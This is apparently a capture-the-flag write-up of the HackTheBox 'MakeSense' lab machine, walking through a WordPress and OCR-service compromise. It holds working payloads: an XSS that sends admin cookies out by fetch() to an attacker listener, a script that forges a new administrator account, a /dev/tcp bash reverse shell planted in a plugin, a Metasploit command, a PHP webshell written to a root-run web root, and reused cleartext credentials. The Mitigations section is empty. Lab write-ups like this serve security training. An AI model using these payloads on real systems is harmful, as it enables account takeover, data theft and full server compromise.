---
title: "MakeSense"
date: 2026-10-31 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [XSS, Wordpress, OCR, File-Write]
description: Writeup for HackTheBox MakeSense machine
image:
  path: assets/img/makesense/makesense.png
  alt: HTB MakeSense
---

## Executive Summary

MakeSense is a medium-difficulty Linux machine on HackTheBox. The attack path begins with a Stored Cross-Site Scripting (XSS) vulnerability in a WordPress contact form whose submissions are reviewed by an administrator. The XSS is exploited to exfiltrate cookies, confirm admin-level access, and ultimately create a new WordPress administrator account by forging authenticated requests on behalf of the reviewing admin. With admin access to WordPress, a PHP reverse shell is injected via the plugin file editor, yielding a shell as `www-data`. Database credentials found in `wp-config.php` are reused for SSH access as `walter`. Privilege escalation targets an OCR web application running as root on an internal port — its canvas-to-file save feature accepts arbitrary filenames including `.php`, allowing a PHP webshell to be uploaded and executed in the root process context.

**Attack Chain:**

1. **Stored XSS in WordPress Contact Form:** The contact form submits to `wp-admin/admin-ajax.php` and the message content is rendered unsanitised when reviewed by the admin user. A crafted payload exfiltrates the admin's session, confirms dashboard access, and registers a new administrator account by abusing the admin's authenticated browser session.

2. **PHP Code Injection via WordPress Plugin Editor:** With admin credentials, the built-in WordPress plugin file editor is used to replace the `Hello Dolly` plugin's source with a PHP reverse shell. Activating the plugin triggers execution, giving a shell as `www-data`.

3. **Credential Reuse, walter user:** The WordPress configuration file `wp-config.php` contains cleartext database credentials. The username `walter` and its password are valid SSH credentials on the underlying system.

4. **Unrestricted File Write in OCR Service, Root:** A PHP-based OCR application runs internally on port 8001 as root. Its "save recognised text" feature writes user-supplied content to a user-controlled filename under the web root without extension validation. By drawing a PHP webshell as canvas image data and saving it with a `.php` extension, arbitrary PHP code is written to disk and executed in the root process context.

---

## Reconnaissance

### Nmap Scan

The assessment begins with a two-phase Nmap scan. The first phase identifies all open TCP ports at high speed; the second performs version detection and default script enumeration against those ports.

```shell
┌──(kali㉿kali)-[~/HTB/Linux/MakeSense]
└─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 10000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan

Nmap scan report for makesense.htb (10.129.34.70)
Host is up (0.25s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-generator: WordPress 7.0
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Agency LLC
| ssl-cert: Subject: commonName=makesense.htb
| Not valid before: 2026-05-29T16:37:29
|_Not valid after:  2126-05-05T16:37:29
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveals two open ports:

- **Port 22 (SSH, OpenSSH 9.6p1):** Standard SSH service on Ubuntu 24.04.
- **Port 443 (HTTPS, Apache 2.4.58):** An Apache web server serving over TLS. Nmap identifies it as a WordPress 7.0 site with the title "Agency LLC". The `ssl-cert` output confirms the hostname `makesense.htb` is declared in the TLS certificate's Common Name, meaning the site uses virtual hosting and this hostname must be added to `/etc/hosts` for proper name resolution.

Add the virtual hostname to the local hosts file before proceeding:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/MakeSense]
└─$ echo "$ip  makesense.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

### WordPress Site

Browsing to `https://makesense.htb/` presents the WebAgency marketing site — a landing page for a web development agency.

<img src="assets/img/makesense/web_dashboard.png" alt="The MakeSense WebAgency landing page served over HTTPS on port 443, showing a professional agency marketing site with sections for services, portfolio, and a contact form at the bottom of the page.">

The network tab in the browser's developer tools confirms what Nmap already reported: the generator meta tag identifies the site as **WordPress 7.0**.

<img src="assets/img/makesense/wordpress_site.png" alt="The browser developer tools network tab showing the HTTP response headers and meta tags for makesense.htb, with the 'generator' meta tag confirming WordPress 7.0 as the CMS powering the site.">

### WPScan Enumeration

With WordPress confirmed, `wpscan` is run to enumerate installed plugins, themes, exposed configuration files, and known vulnerabilities. The `--disable-tls-checks` flag is required because the site uses a self-signed certificate.

```shell
┌──(kali㉿kali)-[~/HTB/Linux/MakeSense]
└─$ wpscan --url https://makesense.htb/ --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://makesense.htb/ [10.129.35.88]
[+] Started: Sun Jul  5 19:25:27 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://makesense.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://makesense.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://makesense.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://makesense.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 7.0 identified (Latest, released on 2026-05-20).
 | Found By: Meta Generator (Passive Detection)
 |  - https://makesense.htb/, Match: 'WordPress 7.0'
 | Confirmed By: Atom Generator (Aggressive Detection)
 |  - https://makesense.htb/?feed=atom, <generator uri="https://wordpress.org/" version="7.0">WordPress</generator>

[+] WordPress theme in use: webagency
 | Location: https://makesense.htb/wp-content/themes/webagency/
 | Style URL: https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0
 | Style Name: WebAgency
 | Style URI: https://example.com
 | Description: Modern web development agency theme with Tailwind CSS...
 | Author: WebAgency Team
 | Author URI: https://example.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <===================================================================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jul  5 19:25:53 2026
[+] Requests Done: 179
[+] Cached Requests: 6
[+] Data Sent: 45.485 KB
[+] Data Received: 430.429 KB
[+] Memory used: 270.41 MB
[+] Elapsed time: 00:00:25
```

Several findings are worth noting. First, the **upload directory has directory listing enabled** at `https://makesense.htb/wp-content/uploads/`. This means anyone can browse the uploaded media files without authentication. Second, **XML-RPC is enabled** — this endpoint can be used for brute-force attacks or API-based actions. Third, no plugins were detected, which means the only WordPress-level attack surface beyond core is the active theme.

Browsing the exposed upload directory reveals a file at `https://makesense.htb/wp-content/uploads/2026/01/voice-message.wav`.

<img src="assets/img/makesense/wav_file.png" alt="The WordPress uploads directory listing showing a voice-message.wav file dated January 2026, accessible without authentication due to directory listing being enabled.">

This audio file is noted for later investigation. Continuing the web enumeration first to fully map the attack surface, the WAV file can be revisited if needed.

---

## Initial Foothold

### Stored XSS via the Contact Form

The site includes a contact form. Submitting test data returns the message "Thank you for contacting us! We will get back to you soon", confirming the form is processed server-side.

<img src="assets/img/makesense/contact_form.png" alt="The WebAgency contact form at the bottom of the landing page, showing input fields for name, email, and message. After submission, a confirmation message is displayed indicating the message was received.">

Inspecting the network tab shows that form submissions are sent as a POST request to `/wp-admin/admin-ajax.php` — WordPress's standard AJAX processing endpoint used by plugins and themes to handle asynchronous form data without loading full admin pages.

<img src="assets/img/makesense/post_admin_ajax.png" alt="The browser developer tools network tab showing the POST request to /wp-admin/admin-ajax.php triggered by the contact form submission. The request body contains the form fields including the message content, and the response is the confirmation text.">

The `admin-ajax.php` handler stores the message for backend review. If the message content is rendered without sanitisation when an administrator views it, it becomes a **Stored XSS** vector — any JavaScript in the message body will execute in the admin's browser when they open the submission.

To test this, a cookie-stealing payload is injected as the message body. It issues a `fetch()` from the admin's browser to an attacker-controlled HTTP listener, appending the admin's cookies as a URL parameter:

```js
<script>fetch('http://YOUR_IP:PORT/?cookie='+encodeURIComponent(document.cookie))</script>
```

A lightweight Python HTTP listener is used to capture the incoming request:

```python
#!/usr/bin/env python3

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080


class XSSHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default logging - we print our own
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        query_params = parse_qs(parsed.query)

        # Print a clear separator for each request
        print("=" * 60)
        print(f"[+] Request from: {self.client_address[0]}")
        print(f"[+] Path: {self.path}")
        print(f"[+] Query params: {dict(query_params)}")

        # Try to extract cookie from common parameter names
        for param in ['c', 'cookie', 'data', 'd']:
            if param in query_params:
                raw_value = query_params[param][0]
                decoded = unquote(raw_value)
                print(f"[+] {param} (raw):     {raw_value}")
                print(f"[+] {param} (decoded): {decoded}")

        # Also print the full raw query string
        print(f"[+] Full raw query: {parsed.query}")
        print("=" * 60)

        # Send a 200 OK with a tiny response
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='replace')

        print("=" * 60)
        print(f"[+] POST from: {self.client_address[0]}")
        print(f"[+] Body: {body}")
        print("=" * 60)

        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')


if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', PORT), XSSHandler)
    print(f"[*] XSS listener running on http://0.0.0.0:{PORT}")
    print(f"[*] Waiting for exfiltrated cookies...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
        server.shutdown()
```

The XSS payload is submitted via the contact form, injected into the message field:

<img src="assets/img/makesense/xxs_cookie_payload.png" alt="The contact form with the XSS payload injected into the message field — a script tag containing a fetch() call to the attacker's listener. The form is about to be submitted, which will store the payload in the WordPress database for later rendering in the admin panel.">

The listener receives a callback from the server's IP (`10.129.35.88`) shortly after submission, confirming that a backend user opened the message and the script executed:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/MakeSense]
└─$ python3 xss_listener.py 8888 
[*] XSS listener running on http://0.0.0.0:8888
[*] Waiting for exfiltrated cookies...
============================================================
[+] Request from: 10.129.35.88
[+] Path: /?cookie=wp-settings-time-3%3D1783263570
[+] Query params: {'cookie': ['wp-settings-time-3=1783263570']}
[+] cookie (raw):     wp-settings-time-3=1783263570
[+] cookie (decoded): wp-settings-time-3=1783263570
[+] Full raw query: cookie=wp-settings-time-3%3D1783263570
============================================================
```

The callback arrives from the machine's IP. The `wp-settings-time-3` cookie is a non-sensitive WordPress preference cookie rather than a session token, but its presence confirms that a WordPress user — specifically the reviewing user — executed the script. The next step is to determine whether this user has administrator-level access to the WordPress dashboard.

### Confirming Admin Access via XSS

A second XSS payload fetches the WordPress admin dashboard (`/wp-admin/`) from within the admin's browser session and POSTs the raw HTML back to the listener. If the admin dashboard is returned, it proves the reviewing user is an administrator.

```js
<script>
fetch('/wp-admin/')
  .then(r => r.text())
  .then(t => fetch('http://YOUR_IP:PORT/', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'data='+encodeURIComponent(t)
  }))
</script>
```

The listener receives a POST request containing URL-encoded HTML:

```
[+] POST from: 10.129.35.88
[+] Body: data=%3C!DOCTYPE%20html%3E%0A%3Chtml%20class%3D%22wp-toolbar%22%0A%09lang%3D%22en-US%22%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text%2Fhtml%3B%20charset%3DUTF-8%22%20%2F%3E%0A%09%3Ctitle%3EDashboard%20%26lsaquo%3B%20Agency%20LLC%20%26%238212%3B%20WordPress%3C%2Ftitle%3E%0A%3Cscript%3E%0AaddLoadEvent%20%3D%20function(func)%7Bif(typeof%20jQuery!%3D%3D'undefined')jQuery(function()%7Bfunc()%3B%7D)%3Belse%20if(typeof%20wpOnload!%3D%3D'function')%7BwpOnload%3Dfunc%3B%7Delse%7Bvar%20oldonload%3DwpOnload%3BwpOnload%3Dfunction()%7Boldonload()
....
....
```

Save the URL-encoded body (everything after `data=`) to a file and decode it for inspection:

```shell
python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read()))" < encoded_dashboard.txt > dashboard.html
```

Then open the `dashboard.html` in browser:

<img src="assets/img/makesense/exilfil_admin_dashboard.png" alt="The WordPress admin dashboard HTML decoded and rendered in a browser, showing the standard Dashboard page with the Agency LLC site name in the title bar — confirming the reviewing user is logged in as a WordPress administrator with full backend access.">

The decoded HTML renders the full WordPress administrator dashboard. The page title reads "Dashboard — Agency LLC — WordPress", confirming full admin-level access. The reviewing user is a WordPress administrator whose authenticated session is available to any script injected via the contact form.

### Registering a New Administrator Account via XSS

With confirmed admin access and the ability to make authenticated requests on the admin's behalf, the next step is to create a new administrator account under our control. This is done in two steps within a single XSS payload:

1. Fetch the `/wp-admin/user-new.php` page and extract the `_wpnonce_create-user` nonce from its HTML. WordPress embeds this token in admin forms to prevent CSRF — but since the injected script runs in the admin's browser, it can extract the nonce legitimately.
2. Submit a POST request to `user-new.php` using the extracted nonce to create a new user with the `administrator` role.

```js
<script>
// First get the nonce from the user-new.php page
fetch('/wp-admin/user-new.php')
  .then(r => r.text())
  .then(t => {
    let nonce = t.match(/name="_wpnonce_create-user" value="([^"]+)"/)?.[1];
    if(nonce) {
      return fetch('/wp-admin/user-new.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: '_wpnonce_create-user='+nonce+'&action=createuser&user_login=pwned1337&email=pwned1337@evil.com&pass1=Hacked123!&pass2=Hacked123!&role=administrator&createuser=Add+New+User'
      });
    }
  })
  .then(r => fetch('http://YOUR_IP:PORT/?status='+(r?.status||'failed')))
</script>
```

The listener receives a callback with HTTP status 200, confirming the user creation succeeded:

```
[+] Request from: 10.129.35.88
[+] Path: /?status=200
[+] Query params: {'status': ['200']}
[+] Full raw query: status=200
```

### Accessing WordPress Admin and Obtaining a Shell

Log in to the WordPress admin panel at `https://makesense.htb/wp-admin/` using the newly created credentials `pwned1337:Hacked123!`. WordPress prompts for administrator email confirmation — click "Remind me later" to skip it and proceed directly to the dashboard.

<img src="assets/img/makesense/email_verification.png" alt="The WordPress administrator email verification prompt displayed immediately after login, asking to confirm the admin email address. The 'Remind me later' link at the bottom allows skipping this step and accessing the dashboard without verification.">

We have admin dashboard:

<img src="assets/img/makesense/admin_dashboard.png" alt="error loading image">

WordPress's built-in **Plugin File Editor** (`/wp-admin/plugin-editor.php`) allows administrators to directly edit the PHP source files of installed plugins through the web interface. This is a known code execution primitive for WordPress admin accounts: any PHP written into a plugin file is executed server-side when the plugin is active.

The `Hello Dolly` plugin — a minimal one-file plugin bundled with every WordPress installation — is selected from the editor dropdown. Its existing PHP code is replaced with a bash reverse shell payload wrapped in a PHP `exec()` call:

```js
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.90/4444 0>&1'");
```

<img src="assets/img/makesense/hello_dolly_plugin_revshell.png" alt="The WordPress Plugin File Editor showing the Hello Dolly plugin's PHP file. The original plugin code has been replaced with the PHP exec() reverse shell payload. The 'Update File' button is visible at the bottom, ready to save the malicious code to disk.">

Click "Update File" to save the modified plugin. Before activating it, start a listener on the attack machine:

```shell
rlwrap -cAr nc -lvnp 4444
```

Navigate to the Installed Plugins page and activate the `Hello Dolly` plugin. Activation loads the plugin's PHP file, executing the `exec()` call and connecting back to the listener.

<img src="assets/img/makesense/activate_plugin.png" alt="The WordPress Installed Plugins list showing the Hello Dolly plugin in a deactivated state with the 'Activate' link highlighted. Clicking this link will load the plugin file and trigger the reverse shell.">

Alternatively, the entire process — admin credential authentication, plugin upload, and shell — can be automated with the Metasploit module `exploit/unix/webapp/wp_admin_shell_upload`:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/MakeSense]
└─$ msfconsole -qx "use exploit/unix/webapp/wp_admin_shell_upload; set PAYLOAD php/meterpreter/reverse_tcp; set RHOSTS 10.129.25.xxx; set RPORT 443; set VHOST makesense.htb; set SSL true; set LHOST tun0; set LPORT 9001; set TARGETURI /; set USERNAME pwned1337; set PASSWORD 'Hacked123!'; run"
```

The reverse shell connects:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/MakeSense]
└─$ rlwrap -cAr nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.15.90] from (UNKNOWN) [10.129.35.88] 50238
bash: cannot set terminal process group (1414): Inappropriate ioctl for device
bash: no job control in this shell
www-data@makesense:/var/www/html/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A shell is established as `www-data` — the Apache web server process account.

### Credential Discovery in wp-config.php

The first file to examine after gaining access to a WordPress installation is always `wp-config.php`, which contains the database connection credentials. In standard WordPress deployments these are MySQL credentials, but in this installation the comment reveals that SQLite is used as the backend instead, with the MySQL credentials serving only as dummy values. The `DB_USER` and `DB_PASSWORD` values may still be reused elsewhere:

```shell
www-data@makesense:/var/www/html/wp-admin$ cat /var/www/html/wp-config.php
cat /var/www/html/wp-config.php
<?php
// SQLite database configuration
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );

// Dummy MySQL settings (required but not used with SQLite)
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );

$table_prefix = 'wp_';
define( 'WP_DEBUG', false );

define('AUTH_KEY',         '%88$_8C0xYR s^9jz;F epY,CO|+Up#ZFIdRS&Gqd~5O/|<^7DmLtEm=SjV|jmWZ');
define('SECURE_AUTH_KEY',  'BD-p*m6hvWAGGBDg%_UC,|>};`C2<1uK>*x!h.Wf*dE;lbhaQVbHw+uc@6OfH>B%');
define('LOGGED_IN_KEY',    ';2fn^sP8F`HK0g,8C&2ar})EifGz@,5Z1{IoDD+CzOT@3w[g~*aM-+=zWcxGBYk2');
define('NONCE_KEY',        's>>f8%soM5P=D$J9UXV-kF]lKZ92.KF%FDS#+! ;(A|C9kMWT(=A>99->-$$>UvU');
define('AUTH_SALT',        'V 0X(1n-@p&})rQpQB_mEax]D9Z*;iM+23&b]!53._;,).:Lj?1ky56*Vaa~KF(B');
define('SECURE_AUTH_SALT', '-{[x4pgl %S5{_s}nE!%H8,05AO_699M4_[mLt^tVC$Kh4;s|n8~O<CSE4#uPWN.');
define('LOGGED_IN_SALT',   'wUxZI^1#)4o)C1KJ8a5o-k{V3L)agi|fofV0SzuSUI;1k%1 !9Q!P@-*j8Y_j%$;');
define('NONCE_SALT',       'j #rMhd[olj2$j8|QAF7L8rR-D kf&gs,:oX4py6x?6V3|oJ?[b~h,[~3uhH.|X%');

if ( ! defined( 'ABSPATH' ) ) {
    define( 'ABSPATH', __DIR__ . '/' );
}

define( 'WP_SQLITE_PLUGIN', true );
require_once ABSPATH . 'wp-settings.php';
```

The credentials `walter:JbhHDAEgXvri3!` are present. Checking `/etc/passwd` confirms that `walter` is a valid system user with a bash shell:

```shell
www-data@makesense:/var/www/html/wp-admin$ cat /etc/passwd | grep 'bash$'
root:x:0:0:root:/root:/bin/bash
walter:x:1000:1000:walter:/home/walter:/bin/bash
admin:x:1001:1001:,,,:/home/admin:/bin/bash
```

Three users have interactive bash shells: `root`, `walter`, and `admin`. Attempting to authenticate to SSH with the discovered credentials succeeds immediately — the database password has been reused as the system account password:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/MakeSense]
└─$ sshpass -p 'JbhHDAEgXvri3!' ssh -o StrictHostKeyChecking=no walter@$ip 
Warning: Permanently added '10.129.35.88' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jul  5 03:57:40 PM UTC 2026

  System load:  0.58              Processes:             219
  Usage of /:   65.4% of 7.53GB   Users logged in:       0
  Memory usage: 8%                IPv4 address for eth0: 10.129.35.88
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Last login: Sun Jul 5 15:57:42 2026 from 10.10.15.90
walter@makesense:~$ id
uid=1000(walter) gid=1000(walter) groups=1000(walter)
walter@makesense:~$ cat user.txt 
*****************61ae1a30b4ec3001f
```

---

## Privilege Escalation

### Discovering the Root OCR Service

With a stable SSH session as `walter`, the first step is to enumerate privileged processes. The `ps aux` output reveals an OCR web application running as root on an internal port:

```shell
walter@makesense:~$ ps aux | grep ocr
root        1401  0.0  0.0   2800  1812 ?        Ss   06:46   0:00 /bin/sh -c /root/.scripts/start_ocr4.sh
root        1402  0.0  0.0   7340  3592 ?        S    06:46   0:02 /bin/bash /root/.scripts/start_ocr4.sh
root        1414  0.1  0.8 230004 33016 ?        S    06:46   0:09 php -S 127.0.0.1:8001 -t /root/ocr4/
walter     21044  0.0  0.0   6544  2284 pts/0    S+   08:02   0:00 grep --color=auto ocr
```

Three processes form the service stack:

- PID 1401 is a `/bin/sh` shell executing a startup script from `/root/.scripts/start_ocr4.sh`.
- PID 1402 is that startup script itself, running under `/bin/bash`.
- PID 1414 is the application itself: `php -S 127.0.0.1:8001 -t /root/ocr4/` — PHP's built-in development server, serving files from the directory `/root/ocr4/`, listening exclusively on loopback address `127.0.0.1` port 8001. The `-t` flag sets the document root, meaning PHP will serve and execute files from `/root/ocr4/`. All three processes run as **root**.

Since the service is bound to `127.0.0.1`, it is not directly reachable from the attack machine. Port-forwarding over the existing SSH session tunnels it locally:

```shell
sshpass -p 'JbhHDAEgXvri3!' ssh -o StrictHostKeyChecking=no -L 8001:127.0.0.1:8001 walter@$ip
```

This binds local port 8001 on the attack machine to the remote `127.0.0.1:8001` service, making it accessible at `http://localhost:8001/`.

### Enumerating the OCR Application

Navigating to `http://localhost:8001/` presents an HTTP Basic Authentication prompt. The same credential set `walter:JbhHDAEgXvri3!` is accepted, granting access to the application.

<img src="assets/img/makesense/ocr_login.png" alt="The HTTP Basic Authentication dialog for the OCR application on port 8001, prompting for a username and password. The credentials walter:JbhHDAEgXvri3! are entered, granting access to the application dashboard.">

The dashboard presents a canvas drawing interface with the tagline "Draw text. Read it back." The intended workflow is: draw text on the canvas with the mouse, click "Recognize", and the application submits the canvas image to the backend OCR engine which returns the recognised text string. A text save feature then writes the recognised output to a file on the server.

<img src="assets/img/makesense/ocr_dashboard.png" alt="The OCR application dashboard showing a blank canvas drawing area on the left, a 'Recognize' button, and the recognised text output field on the right. The UI indicates the workflow: draw text on canvas, submit for recognition, receive the text output.">

Drawing the text "Abc" and clicking "Recognize" triggers a POST request. Inspecting the network traffic shows the canvas is serialised as a base64-encoded PNG image in the `canvas_image` parameter and sent to the backend, which returns the OCR result.

<img src="assets/img/makesense/ocr_request.png" alt="The browser developer tools network tab showing the POST request sent when 'Recognize' is clicked. The request body contains the canvas_image parameter holding a base64-encoded PNG data URL. The response shows the OCR-recognised text — 'AK' in this case, a slightly imperfect recognition of the handwritten 'Abc'.">

The OCR engine returns `AK` — an imperfect but functional recognition of the hand-drawn text. The application then offers a "Save" feature where the user specifies a filename. Specifying `data.txt` and clicking save writes the recognised text to the server:

<img src="assets/img/makesense/ocr_save_data.png" alt="The OCR application save interface showing a filename input field containing 'data.txt' and a Save button. After saving, the application confirms the file has been written, and the content is accessible at http://localhost:8001/saved/data.txt.">

Reading back the saved file confirms the round-trip works correctly:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/MakeSense]
└─$ curl -H 'Authorization: Basic d2FsdGVyOkpiaEhEQUVnWHZyaTMh' -b 'PHPSESSID=9a73m5cl8g79bgql1c03e5abkd' http://localhost:8001/saved/data.txt
AK
```

The file is saved under `saved/` within the web root at `/root/ocr4/saved/`. The critical observation is that **the filename is fully user-controlled** and the application does not restrict which extensions are permitted. The PHP development server will execute any `.php` file served from its document root as PHP code.

### PHP Webshell Upload via Canvas Manipulation

The attack plan is:

1. Programmatically draw the PHP webshell string `<?php system($_GET["cmd"]); ?>` onto the canvas using JavaScript — bypassing the need to draw it by hand.
2. Submit the canvas to the OCR backend, which will recognise the rendered text and return it as the OCR result.
3. Save the result with a `.php` extension — writing a live PHP webshell into the web root under `/root/ocr4/saved/`.
4. Access `http://localhost:8001/saved/cmd.php?cmd=<command>` to execute arbitrary commands as root.

### Understanding the Canvas Submission Flow

Reviewing the application's frontend source code reveals the exact submission mechanism. The canvas is a standard HTML5 `<canvas>` element with id `canvas`:

```html
<canvas id="canvas" width="500" height="200"></canvas>
```

The form that carries the image data to the server is hidden in the DOM:

```html
<form method="post" id="canvasForm" style="display:none;">
    <input type="hidden" name="canvas_image" id="canvas_image">
</form>
```

The `sendCanvas()` function is the bridge between the canvas and the form — it converts the canvas pixel data to a base64 PNG data URL using `toDataURL()`, puts it in the hidden input, and submits the form:

```javascript
function sendCanvas() {
    document.getElementById('canvas_image').value = canvas.toDataURL('image/png');
    document.getElementById('canvasForm').submit();
}
```

This means any content drawn on the canvas — whether by a user's mouse or by programmatic JavaScript drawing — will be packaged and submitted identically.

The approach to inject the webshell payload programmatically:

**Step 1 — Get the canvas element.** The page already declares `const canvas` globally, so different variable names (`c` and `context`) are used with `let` to avoid a "already declared" redeclaration error in the browser console.

**Step 2 — Increase the canvas dimensions.** The default canvas is 500×200 pixels, which is too narrow to fit the full PHP webshell string at a readable font size. Resizing to 750×150 gives enough horizontal space.

**Step 3 — Render the PHP payload as text.** Using `context.fillText()`, the PHP string is drawn directly onto the canvas surface. The font is set large and bold (`bold 48px sans-serif`) so the OCR engine can reliably recognise each character. The colour matches the page's dark drawing style (`#0a0a0a`).

**Step 4 — Call `sendCanvas()`.** This existing function handles everything else: it converts the canvas to a base64 PNG data URL, places it in the hidden form field, and submits it to the OCR backend — exactly the same code path as a legitimate user interaction.

The complete injection script:

```js
let c = document.getElementById('canvas');
let context = c.getContext('2d');

// Increase canvas size to fit the full PHP shell
c.width = 750;
c.height = 150;

context.clearRect(0, 0, c.width, c.height);

context.fillStyle = '#0a0a0a';
context.font = 'bold 48px sans-serif';
context.textBaseline = 'middle';
context.textAlign = 'center';

context.fillText('<?php system($_GET["cmd"]); ?>', c.width / 2, c.height / 2);

sendCanvas();
```

Run the script in the browser's developer console on the OCR application page. The canvas will render the PHP code as an image and submit it to the backend. The OCR engine processes the image, recognises the text, and returns the PHP code as the "recognised text". In the save dialog that follows, set the filename to `cmd.php` and click Save.

<img src="assets/img/makesense/upload_shell.png" alt="The OCR application after the JavaScript payload has been executed in the browser console. The recognised text field shows the PHP webshell code that the OCR engine read from the canvas image. The filename field contains 'cmd.php', and the Save button is about to be clicked to write the PHP file to the server's web root.">

The webshell is written to `/root/ocr4/saved/cmd.php`. Since the PHP built-in server executes all `.php` files in its document root, any request to `http://localhost:8001/saved/cmd.php` will execute the PHP code in the root process context. Testing with `id`:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/MakeSense]
└─$ curl -H 'Authorization: Basic d2FsdGVyOkpiaEhEQUVnWHZyaTMh' -b 'PHPSESSID=9a73m5cl8g79bgql1c03e5abkd' 'http://localhost:8001/saved/cmd.php?cmd=id'
uid=0(root) gid=0(root) groups=0(root)
```

Command execution is confirmed as `uid=0(root)`. Retrieving the root flag:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/MakeSense]
└─$ curl -H 'Authorization: Basic d2FsdGVyOkpiaEhEQUVnWHZyaTMh' -b 'PHPSESSID=9a73m5cl8g79bgql1c03e5abkd' 'http://localhost:8001/saved/cmd.php?cmd=cat%20/root/root.txt'
********************f85e00d13c8b9771  
```

---

## Mitigations

